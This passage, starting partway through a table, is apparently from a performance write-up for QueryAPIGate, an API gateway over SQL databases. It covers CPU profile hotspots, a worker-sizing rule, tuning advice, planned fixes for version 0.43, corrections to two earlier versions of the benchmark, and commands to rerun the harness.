| QueryAPIGate's request handling | 4.6% | 5.6% |
| History writer thread | 3.0% | 3.7% |
| Authentication, limits, quotas, metrics | 2.5% | 2.8% |
| SQL checks, parameters, masking | 1.7% | 1.9% |
| JSON | 1.3% | 2.6% |
| Other | 1.3% | 1.3% |

The busiest single frames say more than the categories:

- **8-10% is threads waiting for the logging module's lock.** Eight threads write log lines through one handler.
- **7-10% is one safety check,** which makes sure a connection doesn't point at QueryAPIGate's own SQLite file. It
  resolves file paths, several system calls, on every call - even for a PostgreSQL connection, which has no file to
  point at.
- **17% is the three store reads in 0.42,** gone with the cache.
- **3% is gunicorn's per-request worker heartbeat.**

## Sizing

A worker runs out of one of two things first:

- **CPU.** Plan on about 550 fast calls a second per worker, or 650 with the metadata cache. That's 75% of measured
  capacity, where p99 stays around 4 ms. Every millisecond of Python a call costs beyond this lookup lowers it.
- **Waiting.** A worker holds at most as many calls at once as it has threads, and each call waits for its query
  plus its round trips: 7 in 0.42, or 4 cached, at the network's round-trip time each. So a worker serves at most
  threads ÷ (query time + round trips × round-trip time) calls a second.

**Workers needed** = the larger of (calls a second ÷ the CPU figure) and (calls a second ÷ the waiting figure), plus
one you can afford to lose.

Two examples, with a 0.5 ms network round trip and 8 threads:

| Calls | CPU figure | Waiting figure | What limits a worker |
|---|---|---|---|
| A 0.03 ms lookup, like ours | 550 a second | 8 ÷ (0.03 + 7 × 0.5 ms) ≈ 2,270 a second | CPU - so fewer threads would do |
| A 20 ms report query | 550 a second, or fewer | 8 ÷ (20 + 3.5 ms) ≈ 340 a second | Waiting - so more threads would help |

These are planning figures from one machine and one query shape. Before you commit to a number, measure your own
queries at 75% of what you plan to serve.

## What to do with this

- **Size with the rule above,** then measure your own queries, which will usually cost more than ours.
- **Turn on `QUERYAPIGATE_METADATA_CACHE_TTL`** if you can accept a few seconds' delay for a change made on another
  instance to reach this one. It caches the rows, never a decision: whether a key is active, expired or used from an
  allowed address is still checked on every call, and a change made through the same server clears the cache at
  once. In return, a worker serves 16-23% more, PostgreSQL does half the work, and across a network a single call
  takes 41% less time.
- **Match threads to your queries:** 2 for fast lookups, which beats the default 8 by 15% here. Keep 8 or more for
  slow queries, exports and `/events`.
- **Turn off gunicorn's access log** if a proxy in front of it already logs requests: +7%.
- **Scale with processes on their own cores.** A hyperthread gave about half a core here.

## What's next, in 0.43

The profile and the round-trip count turned the benchmark into a to-do list:

1. **Fewer round trips per query.** Set the read-only mode and the time limit once per pooled connection instead of
   in every transaction, which takes a query from 4 round trips to 1. At a 0.5 ms round trip, that's about 1.7 ms off
   every call: from 6.2 to about 4.5 ms, and from 3.7 to about 2 ms cached.
2. **Skip the file-path safety check for server databases.** Only SQLite, DuckDB and H2 open a file, so this saves
   7-10% of CPU on every PostgreSQL, MySQL, ClickHouse and Trino call.
3. **Cache the masking hash key,** which is read on every governed call and almost never changes.
4. **Cheaper logging:** a setting to skip the per-request lines, and no single lock for every thread to wait on.
5. **Refresh the schema and masking trace in the background,** so no governed call pays the 75 ms each minute.

## What we got wrong first

This is our third write-up of these numbers. The first two had problems that reviewers caught.

**The first** had two errors:

- **It compared single runs on a laptop that, it turned out, was on battery** and a power-saving profile, with
  nothing pinned. It reported about half the throughput this post does - 368 lookups a second where we now measure
  743, with the same code. Three things changed at once since: power, core pinning, and taking Docker's proxy out of
  the path. We didn't test them one at a time, so we can't say which was worth how much. Power is likely most of it,
  because `/health`, which never touches PostgreSQL, doubled as well.
- **It miscounted the store reads.** It said a call's store transactions went from about 5.5 to 2.6. They actually
  went from 7 statements to 3. PostgreSQL can hold back an idle session's statistics for up to 10 seconds, and we
  read them 2 seconds after each run.

**The second** fixed the method - pinning, interleaving, ranges, open-loop load - and a review rated it 4.1 out of 5.
It still had problems, each fixed here:

- **Some 3-round comparisons,** which, as above, are wrong 10% of the time. Every one was rerun with 5.
- **A threads result that cleared by 3 calls a second.** With 5 rounds, it's clear by 50.
- **Two overstatements.** "Halved single-call latency" is now "−41%". "60-140 ms spikes every minute" is now "about
  75 ms every minute, more on the first call".
- **A round-trip count that didn't explain its own network result.** The calibrated slope test above settles it.
- **Latency percentages measured against too low a "capacity",** a clock range recorded but never used, and the
  load generator's CPU not recorded at all. All three are covered above.

## What this doesn't cover

- **One machine.** The gateway, the database and the load generator share one memory bus and one cooling system, on
  separate cores. Four physical cores for the gateway limit what scale-out can show.
- **No TLS, load balancer or Redis in the path.** Each would add to the cost of a call.
- **A simulated network:** one-way delay, without jitter or loss.
- **Uniform random keys.** Real traffic is skewed. We tested hot rows for writes, but not a skewed read pattern.
- **Small results only:** one row, or a page of 100. Not large results, streaming exports, the MCP server, or other
  databases.
- **p99.99 only from the 150-second runs.** Elsewhere, 30-second runs give about 20,000 samples, enough for p99.9.
- **A profiler that counts threads waiting for Python's lock as busy.** So the shares say where time goes, not
  exactly how much a fix would save.
- **No soak or failure tests:** hours at 75% load, or losing PostgreSQL or a worker mid-run.

## Check it yourself

The reference write-up, with every table, is [Performance, v3](https://github.com/AnanthaRajuC/QueryAPIGate/blob/main/documentation/PERFORMANCE_V3.md).
The raw results, one JSON line per run, are in
[`benchmarks/results/`](https://github.com/AnanthaRajuC/QueryAPIGate/tree/main/benchmarks/results). The harness is
in the repository:

```bash
pip install -e ".[server,postgres,flow]" py-spy
python benchmarks/oltp.py --out /tmp/qag-oltp setup all teardown     # about 3 hours 45 minutes
python benchmarks/oltp_report.py /tmp/qag-oltp/results.jsonl         # every table, median and range per cell
```

It starts its own PostgreSQL with this schema, pins each part to its own cores (choose yours with `--gateway-cpus`,
`--db-cpus` and `--load-cpus`), compares two git refs side by side (`--base` and `--head`), and removes everything
when it's done. `--smoke` checks the setup in about ten minutes.
